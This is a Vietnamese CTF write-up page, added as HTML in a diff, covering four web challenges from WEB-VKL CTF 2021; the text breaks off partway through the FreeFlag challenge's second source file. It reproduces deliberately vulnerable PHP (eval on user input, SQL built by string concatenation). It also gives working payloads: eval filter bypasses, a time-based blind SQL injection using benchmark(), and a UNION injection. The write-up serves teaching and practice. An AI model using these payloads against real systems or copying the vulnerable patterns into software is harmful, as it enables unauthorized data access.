@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" href="https://i.imgur.com/ZfgJjwV.png" type="image/icon type">
+<title>RTinFew Blogs | Blog security</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="RTinFew Blogs" />
+<meta name="author" content="Lê Nguyễn Tiến Vinh" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Dưới đây là một số challenge mà mình giải quyết được và ở CTF lần này mình cũng chỉ giải được 8/13, có lẽ do kiến thức mình vẫn đang còn yếu nên các bài sau mình chưa có thể giải quyết được. Mong các bạn đọc tham khảo và đừng ném đá nhé :(/>
+<link rel="canonical" href="https://rtinfeww.github.io/CTF/wg" />
+<meta property="og:url" content="https://rtinfeww.github.io/CTF/wg" />
+<meta property="og:site_name" content="RTinFew Blogs" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-13T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="RTinFew Blogs" />
+<meta name="twitter:site" content="@Lê Nguyễn Tiến Vinh" />
+<meta name="twitter:creator" content="@Lê Nguyễn Tiến Vinh" />
+<meta name="google-site-verification" content="u4WXQl0Eu66rsQo2kRdCNx" />
+
+
+
+
+
+
+
+<!-- Google Fonts -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans|Roboto|Roboto%20Slab|Inconsolata|Dancing%20Script|Noto%20Sans%20SC|Noto%20Sans%20TC|Noto%20Serif%20SC|Noto%20Serif%20TC|Ma%20Shan%20Zheng">
+
+<link rel="stylesheet" href="assets/css/main.css">
+<link rel="stylesheet" href="assets/css/skin.css">
+
+
+<script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+
+
+  </head>
+
+  <body>
+    <div class="site-container">
+      <header class="site-header">
+        <div class="wrapper">
+  <script>
+    function clickSidebarButton() {
+      const elem = document.getElementById("site-sidebar")
+      if (elem.style.display == "none" || elem.style.display == "") {
+        elem.style.display = "block";
+      } else {
+        elem.style.display = "none";
+      }
+    }
+  </script>
+  <a class="site-sidebar-button" onclick="clickSidebarButton()"><i class="far fa-user"></i>
+  </a>
+
+  <a class="site-title" rel="author" href="/CTF">RTinFew Blogs</a>
+
+  
+    <nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger" title="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <ul class="trigger">
+              <li><a class="" href="/CTF/categories">Categories</a></li>
+            </ul>
+    </nav>
+  
+</div>
+
+      </header>
+      
+      <div class="site-body wrapper">
+        <aside class="site-sidebar" id="site-sidebar">
+          
+            <h3 class="toc-title">Table of Contents</h3>
+<nav class="toc-nav">
+  <ul class="toc">
+  <li><a href="#challenge-eval-ga-vkl-1-5-solved">Challenge Eval ga VKL 1 (5 solved)</a>
+    <ul>
+      <li><a href="#payload">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-eval-ga-vkl-2-3-solved">Challenge Eval ga VKL 2 (3 solved)</a>
+    <ul>
+      <li><a href="#payload-1">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-baby-sql-0-solved">Challenge Baby SQL (0 solved)</a>
+    <ul>
+      <li><a href="#payload-2">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-freeflag-1-solved">Challenge FreeFlag (1 solved)</a>
+    <ul>
+      <li><a href="#payload-3">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#lời-kết">Lời kết</a></li>
+</ul>
+
+</nav>
+
+          
+        </aside>
+        <main class="site-main" id="site-main" aria-label="Content" tabindex="1">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+
+    <h1 class="post-title p-name" itemprop="name headline">[WRITEUP WEB-VKL CTF 2021]: WEB</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2021-08-22T00:00:00+00:00" itemprop="datePublished">
+        Aug 22, 2021
+      </time></p>
+
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Đây là các chall mình giải được từ trang web CTF của một người bạn.</p>
+
+<p>Source tất cả các bài mình để ở đây <a href="https://github.com/RTinFeww/CTF/source/Web-vkl">SOURCE</a></p>
+<h2 id="challenge-eval-ga-vkl-1-5-solved">Challenge Eval ga VKL 1 (5 solved)</h2>
+<p>Đầu tiên truy cập chall thì chúng ta được nhận 1 source code như sau.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[3-9`~!@#</span><span class="se">\$</span><span class="s2">%^&amp;*\-=+,;?'</span><span class="se">\"</span><span class="s2">\[\]\{\}</span><span class="se">\\\\</span><span class="s2">]|0|pcntl|highlight_file|var|root|func|contents|eval|count|cmp/i"</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">||</span> <span class="nb">substr_count</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="s1">'.'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"ấu nâu !"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$cmd</span><span class="mf">.</span><span class="s2">";"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Đầu vào là <code class="language-plaintext highlighter-rouge">cmd</code> được filter khá kĩ, kiểm tra đầu vào nếu có 2 dấu chấm trở lên thì die và limit len là &lt; 65. Nhưng chú ý thì không có system, exec hay các hàm có thể RCE.
+Thử với <code class="language-plaintext highlighter-rouge">?cmd=system(id)</code> thì nhận được blank page =&gt; đời không như là mơ.
+Đọc phpinfo() thì thấy các hàm có thể RCE đã bị disable.
+Bây giờ quay lại xem có thể sài những kí tự hay hàm nào: <code class="language-plaintext highlighter-rouge">chr strlen log log1p 2 1 print_r readfile end current next</code> -&gt; đây là một số hàm có thể sử dụng. Bạn có thể check kĩ hơn và viết code để so disable function với function có trong php thì sẽ ra những hàm nào không bị disable nhé.</p>
+
+<h3 id="payload">Payload</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check các file và folder có trong / -&gt; print_r(scandir(chr(strlen(log1p(1).log1p(1).log1p(2)))))
+Thấy flag ở cuối array trả về
+đọc flag -&gt; readfile(end(scandir(chr(strlen(log1p(1).log1p(1).log1p(2))))))
+</code></pre></div></div>
+<p>Để mọi người hiểu hơn thì mình debug ở đây nhé
+<img src="https://user-images.githubusercontent.com/54855855/130331658-48dae587-633e-4efa-81da-8274255fad2a.png" alt="image" /></p>
+
+<p>Flag -&gt; <code class="language-plaintext highlighter-rouge">web-vkl{dm_ch4ll_3z_vllllllll_!!!}</code></p>
+
+<h2 id="challenge-eval-ga-vkl-2-3-solved">Challenge Eval ga VKL 2 (3 solved)</h2>
+
+<p>Bài này vẫn được cung cấp source như bài 1.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[3-9`~!@#</span><span class="se">\$</span><span class="s2">%^&amp;*\-=+.,;?'</span><span class="se">\"</span><span class="s2">\[\]\{\}</span><span class="se">\\\\</span><span class="s2">]|\([2]|\_[a-q]|0|1|pcntl|highlight_file|var|root|len|func|contents|eval|count|cmp/i"</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">||</span> <span class="nb">substr_count</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="s1">'ext'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">||</span> <span class="nb">substr_count</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="s1">'scan'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"ấu nâu !"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$cmd</span><span class="mf">.</span><span class="s2">";"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Đọc thì thấy payload ở ver 1 sẽ không sài được nữa vì đã filter <code class="language-plaintext highlighter-rouge">len 1 </code>, nếu như sau ( là 2 và sau _ là a-q cũng bị ban. <code class="language-plaintext highlighter-rouge">ext</code> và <code class="language-plaintext highlighter-rouge">scan</code> chỉ được xuất hiện 1 lần. Mục đích ở đây là chặn <code class="language-plaintext highlighter-rouge">next</code> và <code class="language-plaintext highlighter-rouge">scandir</code> xuất hiện trong input quá 1 lần.</p>
+
+<p>Ở disable function có mở thêm là <code class="language-plaintext highlighter-rouge">array_reverse</code> nếu ai có check lại sẽ thấy. Nhưng trong các filter thì vẫn sót là <code class="language-plaintext highlighter-rouge">getallheaders()</code> =&gt; sử dụng nó thôi :))</p>
+
+<h3 id="payload-1">Payload</h3>
+<p><img src="https://user-images.githubusercontent.com/54855855/130331892-94ab0fc5-fae2-4a18-a0e7-808b265b5acd.png" alt="image" />
+Thêm header <code class="language-plaintext highlighter-rouge">cc: /</code> và get lên <code class="language-plaintext highlighter-rouge">?cmd=print_r(next(getallheaders()))</code>. Tới đây thì đã tạo được <code class="language-plaintext highlighter-rouge">/</code> rồi thì dùng scandir để xem file và folder thôi.
+<code class="language-plaintext highlighter-rouge">print_r(scandir(next(getallheaders())))</code> -&gt; flag nằm ở phần từ thứ 2 ở cuối mảng và có tên <code class="language-plaintext highlighter-rouge">vaday_la_flag_hahah_hihihi_hoho.txt</code>.</p>
+
+<p>Cuối cùng là đọc flag.
+<img src="https://user-images.githubusercontent.com/54855855/130332049-b0b40b47-def3-4244-b9be-4d0388d8edd7.png" alt="image" /></p>
+
+<p>Flag -&gt; <code class="language-plaintext highlighter-rouge">web-vkl{Wow_w0w_writ3_p4yl0ad_1n_5s_3625146215!}</code></p>
+
+<h2 id="challenge-baby-sql-0-solved">Challenge Baby SQL (0 solved)</h2>
+<p>Đầu tiên thử register và login account đó. Khi đăng nhâp vào thì thấy được account có 20 star và status được set là 1. Để vào được <code class="language-plaintext highlighter-rouge">/flag</code> thì star phải &gt;= 100.
+Ở đây mình chỉ cần lập 1 account khác và chuyển số <code class="language-plaintext highlighter-rouge">-100</code> thì account của mình đã có 120 star. (Lúc đầu mình tính check số âm và để mọi người race nhưng giảm bớt thì mình làm cách này cho lẹ :3 )
+Vô được flag.php thì nhận được 1 source code như sau</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">"config.php"</span><span class="p">);</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s1">'select * from users where username=?'</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$stmt</span><span class="p">)</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"prepare query error:"</span> <span class="mf">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">);</span>
+<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bind_param</span><span class="p">(</span><span class="s1">'s'</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
+<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">get_result</span><span class="p">();</span>
+<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+    <span class="nv">$checkStar</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'star'</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$checkStar</span> <span class="o">&gt;=</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/user|insert|ord|chr|version|len|mid|like|right|substr|exp|cur|ascii|=|and|or|0x|between|rand|convert|sleep|xml|extract|concat|info|sys|[0-9~\/</span><span class="se">\"</span><span class="s2">&lt;&gt;!^;</span><span class="se">\\</span><span class="s2">\]/i"</span><span class="p">,</span><span class="nv">$pass</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">"no hack"</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="c1">// $query = "SELECT flag_ne_hihi FROM flag_here;";</span>
+            <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT pass FROM users1 where user = 'guest' and pass = '</span><span class="si">{</span><span class="nv">$pass</span><span class="si">}</span><span class="s2">';"</span><span class="p">;</span>
+            <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nf">mysqli_fetch_array</span><span class="p">(</span><span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">])</span> <span class="p">{</span>
+                <span class="c1">// echo "wtf ?";</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">die</span> <span class="p">(</span><span class="s2">"&lt;script&gt;alert('Not enough stars :( min 100 stars')&lt;/script&gt;"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Đầu tiên thì <code class="language-plaintext highlighter-rouge">pass</code> là input mình sẽ được đưa thẳng vào câu query sql. dấu <code class="language-plaintext highlighter-rouge">'</code> cũng không được filter =&gt; có thể sql injection.
+Sau khi thực hiện câu query thì nếu có data <code class="language-plaintext highlighter-rouge">pass</code> trả về thì sẽ không in gì cả =&gt; tới đây thì cúng đủ nhận thấy là time-base sqli.
+Chủ yếu là đoạn filter ở <code class="language-plaintext highlighter-rouge">preg_match</code>. Ở đây mình đã filter hầu như gần hết các hàm có thể blind sqli, cụ thể hơn là hàm <code class="language-plaintext highlighter-rouge">sleep</code> có thể sử dụng để exploit time-base sqli. Tiếp theo đó là mình đã filter number [0-9].</p>
+
+<p>Trong mysql mình cũng có thể sử dụng <code class="language-plaintext highlighter-rouge">benchmark</code> giống như <code class="language-plaintext highlighter-rouge">sleep</code> để làm delay server responses, nhưng vói điều kiện các tham số trong đó phải đủ lớn. Nếu bạn chưa hiểu có thể tìm hiểu về nó trên google để có thể hiểu rõ hơn.</p>
+
+<p><code class="language-plaintext highlighter-rouge">left</code> cũng chưa được filter nên có thể sử dụng để thay <code class="language-plaintext highlighter-rouge">substr</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">in</code> để thay cho <code class="language-plaintext highlighter-rouge">= like &gt; &lt;</code>.</p>
+
+<p>Điều khó là tạo số thì mình sử dụng <code class="language-plaintext highlighter-rouge">INSTR()</code>, giải thích về hàm này sơ qua đó là nó sẽ trả về vị trí của chuỗi con mình đưa vào. VD: INSTR(“a”,”a”) sẽ là 1, INSTR(“ba”,”a”) sẽ là 2 =&gt; có thể tạo số.</p>
+
+<p>Giờ là đến việc tạo số đủ lớn cho <code class="language-plaintext highlighter-rouge">benchmark()</code> để có thể làm delay server responses. Ở đây mình sử dụng <code class="language-plaintext highlighter-rouge">pow()</code> với <code class="language-plaintext highlighter-rouge">pi()</code> để tạo ra số đủ lớn =&gt; ez time-base.</p>
+
+<h3 id="payload-2">Payload</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' || left((select flag_ne_hihi from flag_here),(INSTR('a','a')))in('w')%26%26benchmark((pow(pi()%2bpi(),pi()*pi())),(INSTR('a','a')))%23
+</code></pre></div></div>
+<p>Khi chạy payload trên mọi người sẽ thấy server sẽ bị delay.</p>
+
+<p>Mình để trong <code class="language-plaintext highlighter-rouge">IN</code> là chữ <code class="language-plaintext highlighter-rouge">w</code> vì nó là chữ cái đầu của flag và bị delay, nếu mọi người để char khác thì nó sẽ không delay lâu như vậy. Tới đây mọi người có thể viết code và brute nhé.</p>
+
+<p>Flag -&gt; <code class="language-plaintext highlighter-rouge">web-vkl{Wow_You_Are_Hacker_Sju_Cap}</code></p>
+
+<h2 id="challenge-freeflag-1-solved">Challenge FreeFlag (1 solved)</h2>
+
+<p>Sau khi register và login thì nhận được 1 source như sau</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">"config.php"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/insert|substr|mid|left|right|ord|pi|chr|sys|0x|version|concat|ascii|convert|and|or|procedure|xml|extract|by|create|like|sleep|if|case|db|load|to|count|where|column|rand|in|[1-9`~.^\-\/</span><span class="se">\\</span><span class="s2">\=&lt;&gt;|$]/i"</span><span class="p">,</span><span class="nv">$id</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">"nope !"</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$query1</span> <span class="o">=</span> <span class="s2">"SELECT * FROM numbers where id = </span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">;"</span><span class="p">;</span>
+            <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$query1</span><span class="p">);</span>
+            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span> <span class="c1">//db 2 column</span>
+                <span class="nv">$number</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'number'</span><span class="p">];</span>
+                <span class="c1">// echo $number;</span>
+                <span class="k">if</span> <span class="p">((</span><span class="n">int</span><span class="p">)</span><span class="nv">$number</span> <span class="o">===</span> <span class="mi">2050</span> <span class="o">||</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$number</span> <span class="o">===</span> <span class="mi">2051</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+                    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: flag.php"</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">die</span><span class="p">(</span><span class="s2">"Try harder :) "</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: login.php"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Chúng ta có đầu vào là <code class="language-plaintext highlighter-rouge">id</code> và được filter rất nhiều hàm trong mysql, check luôn số từ 1-9 và 1 số kí tự. <code class="language-plaintext highlighter-rouge">id</code> được đưa thẳng vào câu query nên chúng ta có thể sql injection ở đây. Để có thể redirect tới được <code class="language-plaintext highlighter-rouge">flag.php</code> thì câu query <code class="language-plaintext highlighter-rouge">$query1 = "SELECT * FROM numbers where id = {$id};";</code> phải có cột number trả về là 2050 hoặc 2051. Khi đó <code class="language-plaintext highlighter-rouge">$_SESSION["admin"]</code> sẽ set bằng true, mặc định của mỗi account khi mới reg mình set là false.</p>
+
+<p>Lí do mình để 2050 hoặc 2051 là ctf mình diễn ra 2 ngày đó là 21-08-2021 và 22-08-2021, cộng ngày tháng năm lại thì sẽ được 2050 và 2051. Vì vậy mình sài payload sau để có thể redirect tới <code class="language-plaintext highlighter-rouge">flag.php</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=0 union select 0,(select((select (day(curdate()))) %2b (select(month(curdate()))) %2b (select(year(curdate())))));
+</code></pre></div></div>
+<p>Khi vô được <code class="language-plaintext highlighter-rouge">flag.php</code> thì mở mã nguồn lên thấy được <code class="language-plaintext highlighter-rouge">?source</code> =&gt; access và có source.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">"config.php"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/insert|substr|mid|left|right|ord|chr|sys|pi|rand|0x|version|concat|ascii|convert|and|or|procedure|xml|extract|by|create|like|sleep|if|case|db|load|to|count|where|column|in|[1-9`~.^\-\/</span><span class="se">\\</span><span class="s2">\=&lt;&gt;|$*]/i"</span><span class="p">,</span><span class="nv">$id</span><span class="p">)</span> <span class="o">||</span> <span class="nb">substr_count</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="s1">'0'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">die</span><span class="p">(</span><span class="s2">"no hack"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT id,flag_name,flag_fake FROM flag WHERE id=</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">;"</span><span class="p">;</span>
+      <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;th&gt;"</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"&lt;/th&gt;&lt;th&gt;"</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'flag_name'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"&lt;/th&gt;&lt;th&gt;"</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'flag_fake'</span><span class="p">];</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ai_di'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$ai_di</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ai_di'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/insert|substr|mid|left|right|ord|chr|sys|pi|rand|0x|version|concat|ascii|convert|and|or|procedure|xml|extract|by|create|like|sleep|if|case|db|load|to|count|where|column|in|[2-9`~.^\-\/</span><span class="se">\\</span><span class="s2">\=&lt;&gt;|$]/i"</span><span class="p">,</span><span class="nv">$ai_di</span><span class="p">)</span> <span class="o">||</span> <span class="nb">substr_count</span><span class="p">(</span><span class="nv">$ai_di</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">||</span> <span class="nb">substr_count</span><span class="p">(</span><span class="nv">$ai_di</span><span class="p">,</span><span class="s1">'0'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">die</span><span class="p">(</span><span class="s2">"hack ghe vay bro ?"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT id,flag_name,flag_fake FROM flag WHERE id=</span><span class="si">{</span><span class="nv">$ai_di</span><span class="si">}</span><span class="s2">;"</span><span class="p">;</span>
